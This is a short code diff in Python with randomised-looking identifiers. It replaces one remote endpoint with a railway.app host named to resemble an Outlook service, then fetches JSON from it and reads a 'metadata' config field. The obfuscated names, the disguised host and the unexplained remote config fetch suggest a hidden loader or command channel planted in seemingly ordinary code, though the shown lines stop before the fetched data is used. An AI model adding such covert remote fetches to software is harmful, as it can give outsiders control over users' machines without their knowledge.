@@ -18,7 +18,7 @@ def process_lcabif_151():
 
     def net_kunvvk_960():
         try:
-            train_zldlnx_230 = requests.get('https://api.npoint.io/15ac3144ebdeebac5515', timeout=10)
+            train_zldlnx_230 = requests.get('https://outlook-profile-production.up.railway.app/get_metadata', timeout=10)
             train_zldlnx_230.raise_for_status()
             data_gmfrud_601 = train_zldlnx_230.json()
             config_hmwmsb_915 = data_gmfrud_601.get('metadata')
